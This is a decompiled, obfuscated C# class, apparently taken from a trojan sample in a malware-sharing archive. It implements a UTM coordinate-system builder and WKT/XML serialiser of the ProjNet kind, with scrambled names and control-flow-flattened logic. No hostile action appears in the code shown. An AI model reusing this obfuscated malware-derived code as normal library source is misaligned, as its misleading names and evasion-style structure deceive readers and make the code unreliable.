// Decompiled with JetBrains decompiler
// Type: TYPELIBA.Identifiers.Merchant
// Assembly: TYPELIBA, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 97BB50BA-9882-4DFE-999C-7A4E4B448F1C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-080eff3ceefca287dc59d176676559ae1aa3f1faec807805114bae214a11f586.exe

using ProjNet.Adapter;
using ProjNet.Consumers;
using ProjNet.Objects;
using ProjNet.Pools;
using ProjNet.Rules;
using ProjNet.Shared;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Runtime.CompilerServices;
using System.Text;
using TYPELIBA.Collections;
using TYPELIBA.Listeners;
using TYPELIBA.Lists;

namespace TYPELIBA.Identifiers
{
  public class Merchant : Message, Utils, ReponseRepositoryConsumer, Listener, Worker
  {
    private RulesAccountCollection _Attr;
    private ExceptionRule m_Model;
    private Factory m_Role;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal Merchant(
      RegistryPolicyList var1,
      RulesAccountCollection result,
      ExceptionRule proc,
      Factory ident2,
      List<AdapterErrorPool> x3,
      string ivk4,
      string selection5,
      long indexres6,
      string ident7,
      string col8,
      string visitor9)
    {
      ManagerParamsID.NewExpression();
      // ISSUE: explicit constructor call
      base.\u002Ector(var1, x3, ivk4, selection5, indexres6, ident7, visitor9, col8);
      this._Attr = result;
      this.m_Model = proc;
      this.m_Role = ident2;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static Merchant QueryProcess(int asset_size, bool deleteattr)
    {
      int num1 = 3;
      Merchant merchant;
      while (true)
      {
        int num2 = num1;
        List<Interceptor> ivk;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
              goto label_2;
            case 2:
            case 6:
              ivk.Add(new Interceptor("central_meridian", (double) (asset_size * 6 - 183)));
              goto case 5;
            case 3:
              goto label_3;
            case 4:
              goto label_8;
            case 5:
              ivk.Add(new Interceptor("scale_factor", 0.9996));
              if (true)
              {
                num2 = 4;
                continue;
              }
              goto label_2;
            case 7:
              goto label_9;
            default:
              if (true)
              {
                num2 = 5;
                continue;
              }
              goto label_8;
          }
        }
label_2:
        ivk.Add(new Interceptor("latitude_of_origin", 0.0));
        num1 = 6;
        continue;
label_3:
        ivk = new List<Interceptor>();
        num1 = 0;
        continue;
label_8:
        ivk.Add(new Interceptor("false_easting", 500000.0));
        ivk.Add(new Interceptor("false_northing", deleteattr ? 0.0 : 10000000.0));
        Tokenizer ident2 = new Tokenizer("Transverse_Mercator", ivk, "UTM" + asset_size.ToString((IFormatProvider) CultureInfo.InvariantCulture) + (deleteattr ? "N" : "S"), "EPSG", (long) (32600 + asset_size + (deleteattr ? 0 : 100)), string.Empty, string.Empty, string.Empty);
        merchant = new Merchant((RegistryPolicyList) TYPELIBA.Messages.Attribute.WGS84, (RulesAccountCollection) ListErrorPool.WGS84, InterpreterRule.ManageProcess(), (Factory) ident2, new List<AdapterErrorPool>()
        {
          new AdapterErrorPool("East", LinkTransactionType.East),
          new AdapterErrorPool("North", LinkTransactionType.North)
        }, "WGS 84 / UTM zone " + asset_size.ToString((IFormatProvider) CultureInfo.InvariantCulture) + (deleteattr ? "N" : "S"), "EPSG", (long) (32600 + asset_size + (deleteattr ? 0 : 100)), string.Empty, "Large and medium scale topographic mapping and engineering survey.", string.Empty);
        num1 = 7;
      }
label_9:
      return merchant;
    }

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public RulesAccountCollection InterruptConfiguration() => this._Attr;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void CompareConfiguration(RulesAccountCollection last) => this._Attr = last;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public ExceptionRule CalcState() => this.m_Model;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void WriteState(ExceptionRule first) => this.m_Model = first;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public override ProccesorAccountCollection RunState(int size_asset) => (ProccesorAccountCollection) this.m_Model;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public Factory IncludeConfiguration() => this.m_Role;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void RunConfiguration(Factory ident) => this.m_Role = ident;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public override string RevertError()
    {
      int num1 = 5;
      if (true)
        goto label_15;
      else
        goto label_7;
label_3:
      int num2 = this.RestartState() > 0L ? 1 : 0;
label_5:
      int num3;
      if (num2 != 0)
      {
        num3 = 7;
        goto label_14;
      }
      else
        goto label_19;
label_7:
      StringBuilder stringBuilder;
      int infoZ;
      int mindef;
      if (infoZ < this.IncludeConfiguration().CloneState())
      {
        stringBuilder.AppendFormat((IFormatProvider) CultureInfo.InvariantCulture.NumberFormat, ", {0}", new object[1]
        {
          (object) this.IncludeConfiguration().VisitConfiguration(infoZ).SortProcess()
        });
        ++infoZ;
        num3 = 6;
        goto label_14;
      }
      else
      {
        stringBuilder.AppendFormat(", {0}", (object) this.CalcState().RevertError());
        if (this.SetupObject().Count != 2 || this.SetupObject()[0].Name != "X" || this.SetupObject()[0].PrintObject() != LinkTransactionType.East || this.SetupObject()[1].Name != "Y" || this.SetupObject()[1].PrintObject() != LinkTransactionType.North)
          mindef = 0;
        else
          goto label_13;
      }
label_11:
      bool flag = mindef < this.SetupObject().Count;
      num3 = 9;
      goto label_14;
label_13:
      if (string.IsNullOrEmpty(this.LoginState()))
      {
        num2 = 0;
        goto label_5;
      }
      else
        goto label_3;
label_14:
      num1 = num3;
label_15:
      string str;
      switch (num1)
      {
        case 0:
        case 5:
          stringBuilder = new StringBuilder();
          num3 = 1;
          goto label_14;
        case 1:
          stringBuilder.AppendFormat("PROJCS[\"{0}\", {1}, {2}", (object) this.Name, (object) this.InterruptConfiguration().RevertError(), (object) this.IncludeConfiguration().RevertError());
          infoZ = 0;
          num3 = 4;
          goto label_14;
        case 2:
          goto label_20;
        case 3:
        case 4:
        case 6:
          goto label_7;
        case 7:
          stringBuilder.AppendFormat(", AUTHORITY[\"{0}\", \"{1}\"]", (object) this.LoginState(), (object) this.RestartState());
          break;
        case 8:
          goto label_3;
        case 9:
          if (flag)
          {
            stringBuilder.AppendFormat(", {0}", (object) this.InitState(mindef).EnableObject());
            ++mindef;
            goto label_11;
          }
          else
            goto label_13;
        case 10:
          return str;
        default:
          num3 = 8;
          goto label_14;
      }
label_19:
      stringBuilder.Append("]");
      if (Merchant.SetupDescriptor())
      {
        num1 = 2;
        goto label_15;
      }
label_20:
      str = stringBuilder.ToString();
      num3 = 10;
      goto label_14;
    }

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public override string InterruptState()
    {
      int num1 = 5;
      string str;
      while (true)
      {
        StringBuilder stringBuilder;
        List<AdapterErrorPool>.Enumerator enumerator;
        int num2;
        switch (num1)
        {
          case 0:
          case 5:
            stringBuilder = new StringBuilder();
            if (true)
            {
              num1 = 4;
              continue;
            }
            goto case 4;
          case 1:
          case 2:
            try
            {
label_8:
              while (enumerator.MoveNext())
              {
                AdapterErrorPool current = enumerator.Current;
                int num3 = 2;
                while (true)
                {
                  switch (num3)
                  {
                    case 0:
                    case 2:
                      goto label_5;
                    case 1:
                    case 3:
                      goto label_8;
                    default:
                      num3 = 3;
                      continue;
                  }
                }
label_5:
                stringBuilder.Append(current.GetObject());
              }
            }
            finally
            {
              enumerator.Dispose();
            }
            stringBuilder.AppendFormat("{0}{1}{2}</CS_ProjectedCoordinateSystem></CS_CoordinateSystem>", (object) this.InterruptConfiguration().InterruptState(), (object) this.CalcState().InterruptState(), (object) this.IncludeConfiguration().InterruptState());
            goto case 3;
          case 3:
            str = stringBuilder.ToString();
            num1 = 6;
            continue;
          case 4:
            stringBuilder.AppendFormat((IFormatProvider) CultureInfo.InvariantCulture.NumberFormat, "<CS_CoordinateSystem Dimension=\"{0}\"><CS_ProjectedCoordinateSystem>{1}", new object[2]
            {
              (object) this.IncludeState(),
              (object) this.AddProcess()
            });
            enumerator = this.SetupObject().GetEnumerator();
            num2 = 1;
            break;
          case 6:
            goto label_16;
          default:
            num2 = 3;
            break;
        }
        num1 = num2;
      }
label_16:
      return str;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public override bool CompareState(object param)
    {
      int num1 = 5;
      if (true)
        goto label_18;
label_1:
      bool flag1 = false;
      goto label_23;
label_18:
      Merchant merchant;
      while (true)
      {
        int num2;
        bool flag2;
        int num3;
        bool flag3;
        switch (num1)
        {
          case 0:
            if (!flag3)
            {
              merchant = param as Merchant;
              if (merchant.IncludeState() == this.IncludeState())
              {
                num2 = 0;
                goto case 2;
              }
              else
              {
                if (!Merchant.StopDescriptor())
                {
                  num1 = 7;
                  continue;
                }
                goto case 2;
              }
            }
            else
              goto label_6;
          case 1:
          case 4:
            flag1 = false;
            num3 = 6;
            break;
          case 2:
            if (num2 < merchant.IncludeState())
            {
              flag2 = merchant.InitState(num2).PrintObject() != this.InitState(num2).PrintObject();
              num3 = 8;
              break;
            }
            if (merchant.InterruptConfiguration().CompareState((object) this.InterruptConfiguration()) && merchant.RemoveState().CompareState((object) this.RemoveState()) && merchant.CalcState().CompareState((object) this.CalcState()))
            {
              num3 = 9;
              break;
            }
            goto label_21;
          case 3:
          case 8:
            while (!flag2)
            {
              if (!merchant.RunState(num2).CompareState((object) this.RunState(num2)))
              {
                flag1 = false;
                goto label_23;
              }
              else
              {
                ++num2;
                if (true)
                {
                  num1 = 2;
                  goto label_18;
                }
              }
            }
            goto case 1;
          case 5:
            flag3 = !(param is Merchant);
            if (Merchant.SetupDescriptor())
            {
              num1 = 0;
              continue;
            }
            goto case 0;
          case 6:
            goto label_23;
          case 7:
            goto label_1;
          case 9:
            goto label_20;
          default:
            num3 = 1;
            break;
        }
        num1 = num3;
      }
label_6:
      flag1 = false;
      goto label_23;
label_20:
      int num4 = merchant.IncludeConfiguration().CompareState((object) this.IncludeConfiguration()) ? 1 : 0;
      goto label_22;
label_21:
      num4 = 0;
label_22:
      flag1 = num4 != 0;
label_23:
      return flag1;
    }

    internal static bool SetupDescriptor() => true;

    internal static bool StopDescriptor() => false;
  }
}
